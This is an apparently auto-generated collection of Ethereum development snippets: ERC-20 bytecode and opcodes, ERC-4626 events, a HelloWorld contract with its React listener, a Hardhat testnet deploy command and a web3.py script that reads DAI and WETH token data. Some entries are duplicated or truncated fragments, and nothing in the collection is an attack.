solidity\nCODE:\n```\n60806040523480156200001157600080fd5b506040516200153938038062001539833981810160405260208110156200003757600080fd5b81019080805190602001909291905050506040518060400160405280600581526020017f42617369630000000000000000000000000000000000000000000000000000008152506040518060400160405280600381526020017f42534300000000000000000000000000000000000000000000000000000000008152508160039080519060200190620000cc92919062000389565b508060049080519060200190620000e592919062000389565b506012600560006101000a81548160ff021916908360ff16021790555050506200011633826200011d60201b60201c565b5062000438565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415620001c1576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601f8152602001807f45524332303a206d696e7420746f20746865207a65726f20616464726573730081525060200191505060405180910390fd5b620001d560008383620002fb60201b60201c565b620001f1816002546200030060201b62000f2d1790919060201c565b6002819055506200024f816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546200030060201b62000f2d1790919060201c565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a35050565b505050565b6000808284019050838110156200037f576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b8091505092915050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f10620003cc57805160ff1916838001178555620003fd565b82800160010185558215620003fd579182015b82811115620003fc578251825591602001919060010190620003df565b5b5090506200040c919062000410565b5090565b6200043591905b808211156200043157600081600090555060010162000417565b5090565b90565b6110f180620004486000396000f3fe608060405234801561001057600080fd5b50600436106100a95760003560e01c80633950935111610071578063395093511461025f57806370a08231146102c557806395d89b411461031d578063a457c2d7146103a0578063a9059cbb14610406578063dd62ed3e1461046c576100a9565b806306fdde03146100ae578063095ea7b31461013157806318160ddd1461019757806323b872dd146101b5578063313ce5671461023b575b600080fd5b6100b66104e4565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100f65780820151818401526020810190506100db565b50505050905090810190601f1680156101235780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b61017d6004803603604081101561014757600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610586565b604051808215151515815260200191505060405180910390f35b61019f6105a4565b6040518082815260200191505060405180910390f35b610221600480360360608110156101cb57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506105ae565b604051808215151515815260200191505060405180910390f35b610243610687565b604051808260ff1660ff16815260200191505060405180910390f35b6102ab6004803603604081101561027557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061069e565b604051808215151515815260200191505060405180910390f35b610307600480360360208110156102db57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610751565b6040518082815260200191505060405180910390f35b610325610799565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561036557808201518184015260208101905061034a565b50505050905090810190601f1680156103925780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6103ec600480360360408110156103b657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061083b565b604051808215151515815260200191505060405180910390f35b6104526004803603604081101561041c57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610908565b604051808215151515815260200191505060405180910390f35b6104ce6004803603604081101561048257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610926565b6040518082815260200191505060405180910390f35b606060038054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561057c5780601f106105515761010080835404028352916020019161057c565b820191906000526020600020905b81548152906001019060200180831161055f57829003601f168201915b5050505050905090565b600061059a6105936109ad565b84846109b5565b6001905092915050565b6000600254905090565b60006105bb848484610bac565b61067c846105c76109ad565b6106778560405180606001604052806028815260200161102660289139600160008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600061062d6109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6109b5565b600190509392505050565b6000600560009054906101000a900460ff16905090565b60006107476106ab6109ad565b8461074285600160006106bc6109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2d90919063ffffffff16565b6109b5565b6001905092915050565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b606060048054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156108315780601f1061080657610100808354040283529160200191610831565b820191906000526020600020905b81548152906001019060200180831161081457829003601f168201915b5050505050905090565b60006108fe6108486109ad565b846108f98560405180606001604052806025815260200161109760259139600160006108726109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6109b5565b6001905092915050565b600061091c6109156109ad565b8484610bac565b6001905092915050565b6000600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610a3b576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260248152602001806110736024913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610ac1576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526022815260200180610fde6022913960400191505060405180910390fd5b80600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040518082815260200191505060405180910390a3505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610c32576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602581526020018061104e6025913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610cb8576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526023815260200180610fbb6023913960400191505060405180910390fd5b610cc3838383610fb5565b610d2e81604051806060016040528060268152602001611000602691396000808773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610dc1816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2d90919063ffffffff16565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a3505050565b6000838311158290610f1a576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b83811015610edf578082015181840152602081019050610ec4565b50505050905090810190601f168015610f0c5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385039050809150509392505050565b600080828401905\n```\n\n----------------------------------------\n\nTITLE: CREATE2 Operation in EVM (F5)\nDESCRIPTION: Creates a new contract with deterministic address based on a salt value. Allows for predictable contract addresses regardless of nonce.\n\nLANGUAGE: solidity\nCODE:\n```\naddr = keccak256(0xff ++ address(this) ++ salt ++ keccak256(mem[ost:ost+len-1]))[12:]\n```\n\n----------------------------------------\n\nTITLE: Withdraw Event in ERC-4626 Vault (Solidity)\nDESCRIPTION: This event must be emitted when shares are withdrawn from the vault by a depositor via the redeem or withdraw methods. It records all parties involved and the asset/share amounts.\n\nLANGUAGE: solidity\nCODE:\n```\nevent Withdraw(\n    address indexed sender,\n    address indexed receiver,\n    address indexed owner,\n    uint256 assets,\n    uint256 shares\n)\n```\n\n----------------------------------------\n\nTITLE: Emitting Approval Event in ERC-20 Implementation\nDESCRIPTION: This line emits an Approval event after an allowance is set. The event notifies off-chain applications and services about the approval, allowing them to track and respond to allowance changes.\n\nLANGUAGE: solidity\nCODE:\n```\nemit Approval(owner, spender, amount);\n}\n```\n\n----------------------------------------\n\nTITLE: Withdraw Event in ERC-4626 Vault (Solidity)\nDESCRIPTION: This event must be emitted when shares are withdrawn from the vault by a depositor via the redeem or withdraw methods. It records all parties involved and the asset/share amounts.\n\nLANGUAGE: solidity\nCODE:\n```\nevent Withdraw(\n    address indexed sender,\n    address indexed receiver,\n    address indexed owner,\n    uint256 assets,\n    uint256 shares\n)\n```\n\n----------------------------------------\n\nTITLE: Implementing balanceOf Function in ERC-20\nDESCRIPTION: The balanceOf function is part of the ERC-20 interface that returns the token balance of a specific account. It takes an address parameter and returns a uint256 value representing the account's token balance.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC20 Token Contract in Solidity\nDESCRIPTION: A complete implementation of an ERC20 token with name 'Basic' and symbol 'BSC', with decimals set to 18. The contract includes all standard ERC20 functions including transfer, approve, allowance, balanceOf, and the necessary SafeMath implementations to prevent overflow/underflow.\n\nLANGUAGE: solidity\nCODE:\n```\n608060405234801561001057600080fd5b506040516200153938038062001539833981810160405260208110156200003757600080fd5b81019080805190602001909291905050506040518060400160405280600581526020017f42617369630000000000000000000000000000000000000000000000000000008152506040518060400160405280600381526020017f42534300000000000000000000000000000000000000000000000000000000008152508160039080519060200190620000cc92919062000389565b508060049080519060200190620000e592919062000389565b506012600560006101000a81548160ff021916908360ff16021790555050506200011633826200011d60201b60201c565b5062000438565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415620001c1576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601f8152602001807f45524332303a206d696e7420746f20746865207a65726f20616464726573730081525060200191505060405180910390fd5b620001d560008383620002fb60201b60201c565b620001f1816002546200030060201b62000f2d1790919060201c565b6002819055506200024f816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546200030060201b62000f2d1790919060201c565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a35050565b505050565b6000808284019050838110156200037f576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b8091505092915050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f10620003cc57805160ff1916838001178555620003fd565b82800160010185558215620003fd579182015b82811115620003fc578251825591602001919060010190620003df565b5b5090506200040c919062000410565b5090565b6200043591905b808211156200043157600081600090555060010162000417565b5090565b90565b6110f180620004486000396000f3fe608060405234801561001057600080fd5b50600436106100a95760003560e01c80633950935111610071578063395093511461025f57806370a08231146102c557806395d89b411461031d578063a457c2d7146103a0578063a9059cbb14610406578063dd62ed3e1461046c576100a9565b806306fdde03146100ae578063095ea7b31461013157806318160ddd1461019757806323b872dd146101b5578063313ce5671461023b575b600080fd5b6100b66104e4565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100f65780820151818401526020810190506100db565b50505050905090810190601f1680156101235780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b61017d6004803603604081101561014757600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610586565b604051808215151515815260200191505060405180910390f35b61019f6105a4565b6040518082815260200191505060405180910390f35b610221600480360360608110156101cb57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506105ae565b604051808215151515815260200191505060405180910390f35b610243610687565b604051808260ff1660ff16815260200191505060405180910390f35b6102ab6004803603604081101561027557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061069e565b604051808215151515815260200191505060405180910390f35b610307600480360360208110156102db57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610751565b6040518082815260200191505060405180910390f35b610325610799565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561036557808201518184015260208101905061034a565b50505050905090810190601f1680156103925780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6103ec600480360360408110156103b657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061083b565b604051808215151515815260200191505060405180910390f35b6104526004803603604081101561041c57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610908565b604051808215151515815260200191505060405180910390f35b6104ce6004803603604081101561048257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610926565b6040518082815260200191505060405180910390f35b606060038054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561057c5780601f106105515761010080835404028352916020019161057c565b820191906000526020600020905b81548152906001019060200180831161055f57829003601f168201915b5050505050905090565b600061059a6105936109ad565b84846109b5565b6001905092915050565b6000600254905090565b60006105bb848484610bac565b61067c846105c76109ad565b6106778560405180606001604052806028815260200161102660289139600160008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600061062d6109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6109b5565b600190509392505050565b6000600560009054906101000a900460ff16905090565b60006107476106ab6109ad565b8461074285600160006106bc6109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2d90919063ffffffff16565b6109b5565b6001905092915050565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b606060048054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156108315780601f1061080657610100808354040283529160200191610831565b820191906000526020600020905b81548152906001019060200180831161081457829003601f168201915b5050505050905090565b60006108fe6108486109ad565b846108f98560405180606001604052806025815260200161109760259139600160006108726109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6109b5565b6001905092915050565b600061091c6109156109ad565b8484610bac565b6001905092915050565b6000600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610a3b576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260248152602001806110736024913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610ac1576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526022815260200180610fde6022913960400191505060405180910390fd5b80600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040518082815260200191505060405180910390a3505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610c32576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602581526020018061104e6025913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610cb8576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526023815260200180610fbb6023913960400191505060405180910390fd5b610cc3838383610fb5565b610d2e81604051806060016040528060268152602001611000602691396000808773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610dc1816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2d90919063ffffffff16565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a3505050565b6000838311158290610f1a576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b83811015610edf578082015181840152602081019050610ec4565b50505050905090810190601f168015610f0c5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385039050809150509392505050565b600080828401905\n```\n\n----------------------------------------\n\nTITLE: Importing ICrossDomainMessenger Interface in Solidity\nDESCRIPTION: Imports the ICrossDomainMessenger interface which defines how contracts send messages between Ethereum layers. This interface is essential for the cross-domain communication functionality.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: MIT\npragma solidity >0.5.0 <0.9.0;\n\n/* Interface Imports */\nimport { ICrossDomainMessenger } from \"./ICrossDomainMessenger.sol\";\n```\n\n----------------------------------------\n\nTITLE: Removing Liquidity Between Token Pairs in Uniswap V2 Router\nDESCRIPTION: The base function for removing liquidity from a token pair. It transfers the liquidity tokens from the user to the pair contract, burns them, and returns the underlying tokens to the specified address. The function ensures minimum amounts are received before the deadline.\n\nLANGUAGE: solidity\nCODE:\n```\n    // **** REMOVE LIQUIDITY ****\n    function removeLiquidity(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) public virtual override ensure(deadline) returns (uint amountA, uint amountB) {\n```\n\n----------------------------------------\n\nTITLE: Checking Maximum Deposit Limit in ERC-4626 Vault\nDESCRIPTION: The maxDeposit function returns the maximum amount of underlying assets that can be deposited by a specific receiver in a single deposit call.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction maxDeposit(address receiver) public view returns (uint256 maxAssets)\n```\n\n----------------------------------------\n\nTITLE: Implementing HelloWorld Smart Contract in Solidity\nDESCRIPTION: A simple Solidity smart contract that stores a message string and emits an event when the message is updated. The contract includes a constructor for initialization and an update function that changes the stored message.\n\nLANGUAGE: solidity\nCODE:\n```\n// HelloWorld.sol\n\n// Specifies the version of Solidity, using semantic versioning.\n// Learn more: https://solidity.readthedocs.io/en/v0.5.10/layout-of-source-files.html#pragma\npragma solidity ^0.7.3;\n\n// Defines a contract named `HelloWorld`.\n// Un contratto è una raccolta di funzioni e dati (il suo stato). Once deployed, a contract resides at a specific address on the Ethereum blockchain. Learn more: https://solidity.readthedocs.io/en/v0.5.10/structure-of-a-contract.html\ncontract HelloWorld {\n\n   //Emitted when update function is called\n   //Smart contract events are a way for your contract to communicate that something happened on the blockchain to your app front-end, which can be 'listening' for certain events and take action when they happen.\n   event UpdatedMessages(string oldStr, string newStr);\n\n   // Declares a state variable `message` of type `string`.\n   // Le variabili di stato sono variabili con valori memorizzati in modo permanente nello spazio di archiviazione (storage) del contratto. The keyword `public` makes variables accessible from outside a contract and creates a function that other contracts or clients can call to access the value.\n   string public message;\n\n   // Similar to many class-based object-oriented languages, a constructor is a special function that is only executed upon contract creation.\n   // I costruttori sono utilizzati per inizializzare i dati del contratto. Learn more:https://solidity.readthedocs.io/en/v0.5.10/contracts.html#constructors\n   constructor(string memory initMessage) {\n\n      // Accepts a string argument `initMessage` and sets the value into the contract's `message` storage variable).\n      message = initMessage;\n   }\n\n   // A public function that accepts a string argument and updates the `message` storage variable.\n   function update(string memory newMessage) public {\n      string memory oldMsg = message;\n      message = newMessage;\n      emit UpdatedMessages(oldMsg, newMessage);\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Constructor for ERC-721 Token in Vyper\nDESCRIPTION: Constructor function that initializes the contract by registering ERC-165 and ERC-721 interfaces and setting the minter address to the contract deployer.\n\nLANGUAGE: vyper\nCODE:\n```\n@external\ndef __init__():\n    \"\"\"\n    @dev Contract constructor.\n    \"\"\"\n    self.supportedInterfaces[ERC165_INTERFACE_ID] = True\n    self.supportedInterfaces[ERC721_INTERFACE_ID] = True\n    self.minter = msg.sender\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC20 Allowance Query Function in Solidity\nDESCRIPTION: This view function returns the amount of tokens that a spender is allowed to withdraw from an owner. It reads from the _allowances mapping which stores all approved allowances.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev See {IERC20-allowance}.\n     */\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n```\n\n----------------------------------------\n\nTITLE: ERC20 Token Opcodes Fragment - Contract Initialization\nDESCRIPTION: Assembly opcodes representing the initialization of the ERC20 token contract. It shows the setup of memory, code loading, and initial function calls. The opcodes translate to operations for setting up the token name and symbol.\n\nLANGUAGE: opcodes\nCODE:\n```\nPUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH3 0x11 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH3 0x1539 CODESIZE SUB DUP1 PUSH3 0x1539 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH3 0x37 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x5 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x4261736963000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x3 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x4253430000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP2 PUSH1 0x3 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0xCC SWAP3 SWAP2 SWAP1 PUSH3 0x389 JUMP\n```\n\n----------------------------------------\n\nTITLE: Implementing Smart Contract Event Listener in React\nDESCRIPTION: This function listens for the UpdatedMessages event from the HelloWorld smart contract and updates the UI accordingly. When the event is detected, it updates the message state and notifies the user.\n\nLANGUAGE: javascript\nCODE:\n```\n// HelloWorld.js\n\nfunction addSmartContractListener() {\n  helloWorldContract.events.UpdatedMessages({}, (error, data) => {\n    if (error) {\n      setStatus(\"😥 \" + error.message)\n    } else {\n      setMessage(data.returnValues[1])\n      setNewMessage(\"\")\n      setStatus(\"🎉 Your message has been updated!\")\n    }\n  })\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing _beforeTokenTransfer Hook in ERC-20 Contract\nDESCRIPTION: Empty hook function that's called before any token transfer, including minting and burning. Designed to be overridden by derived contracts to add custom logic to token transfers without modifying the core functions.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @dev Hook that is called before any transfer of tokens. This includes\n * minting and burning.\n *\n * Calling conditions:\n *\n * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n * will be to transferred to `to`.\n * - when `from` is zero, `amount` tokens will be minted for `to`.\n * - when `to` is zero, `amount` of ``from``'s tokens will be burned.\n * - `from` and `to` are never both zero.\n *\n * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n */\nfunction _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Delegatecall in Ethereum Smart Contract Upgrades\nDESCRIPTION: Describes how delegatecall is used in proxy patterns to execute logic from one contract within the storage context of another. This is a key mechanism that allows contract functionality to be upgraded while preserving state data and contract addresses.\n\nLANGUAGE: solidity\nCODE:\n```\nDelegatecall\n```\n\n----------------------------------------\n\nTITLE: Deploying Smart Contract with Hardhat to Goerli Network\nDESCRIPTION: Command to deploy a smart contract to the Goerli testnet using Hardhat. This executes the deploy.js script and specifies the Goerli network as the deployment target.\n\nLANGUAGE: shell\nCODE:\n```\nnpx hardhat run scripts/deploy.js --network goerli\n```\n\n----------------------------------------\n\nTITLE: Interacting with ERC-20 Tokens using Web3.py in Python\nDESCRIPTION: This Python script demonstrates how to interact with ERC-20 token contracts on Ethereum using the Web3.py library. It connects to an Ethereum node, defines a simplified ABI, and queries token information like symbol, decimals, total supply, and account balances.\n\nLANGUAGE: python\nCODE:\n```\nfrom web3 import Web3\n\n\nw3 = Web3(Web3.HTTPProvider(\"https://cloudflare-eth.com\"))\n\ndai_token_addr = \"0x6B175474E89094C44Da98b954EedeAC495271d0F\"     # DAI\nweth_token_addr = \"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2\"    # Wrapped ether (WETH)\n\nacc_address = \"0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11\"        # Uniswap V2: DAI 2\n\n# This is a simplified Contract Application Binary Interface (ABI) of an ERC-20 Token Contract.\n# It will expose only the methods: balanceOf(address), decimals(), symbol() and totalSupply()\nsimplified_abi = [\n    {\n        'inputs': [{'internalType': 'address', 'name': 'account', 'type': 'address'}],\n        'name': 'balanceOf',\n        'outputs': [{'internalType': 'uint256', 'name': '', 'type': 'uint256'}],\n        'stateMutability': 'view', 'type': 'function', 'constant': True\n    },\n    {\n        'inputs': [],\n        'name': 'decimals',\n        'outputs': [{'internalType': 'uint8', 'name': '', 'type': 'uint8'}],\n        'stateMutability': 'view', 'type': 'function', 'constant': True\n    },\n    {\n        'inputs': [],\n        'name': 'symbol',\n        'outputs': [{'internalType': 'string', 'name': '', 'type': 'string'}],\n        'stateMutability': 'view', 'type': 'function', 'constant': True\n    },\n    {\n        'inputs': [],\n        'name': 'totalSupply',\n        'outputs': [{'internalType': 'uint256', 'name': '', 'type': 'uint256'}],\n        'stateMutability': 'view', 'type': 'function', 'constant': True\n    }\n]\n\ndai_contract = w3.eth.contract(address=w3.to_checksum_address(dai_token_addr), abi=simplified_abi)\nsymbol = dai_contract.functions.symbol().call()\ndecimals = dai_contract.functions.decimals().call()\ntotalSupply = dai_contract.functions.totalSupply().call() / 10**decimals\naddr_balance = dai_contract.functions.balanceOf(acc_address).call() / 10**decimals\n\n#  DAI\nprint(\"===== %s =====\" % symbol)\nprint(\"Total Supply:\", totalSupply)\nprint(\"Addr Balance:\", addr_balance)\n\nweth_contract = w3.eth.contract(address=w3.to_checksum_address(weth_token_addr), abi=simplified_abi)\nsymbol = weth_contract.functions.symbol().call()\ndecimals = weth_contract.functions.decimals().call()\ntotalSupply = weth_contract.functions.totalSupply().call() / 10**decimals\naddr_balance = weth_contract.functions.balanceOf(acc_address).call() / 10**decimals\n\n#  WETH\nprint(\"===== %s =====\" % symbol)\nprint(\"Total Supply:\", totalSupply)\nprint(\"Addr Balance:\", addr_balance)\n```\n\n----------------------------------------\n\nTITLE: Implementing _burn Function in ERC-20 Contract\nDESCRIPTION: Internal function to destroy tokens from an account, reducing the total supply. This function validates the account has sufficient balance, calls the hook function, updates balances and total supply, and emits a Transfer event to the zero address.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @dev Destroys 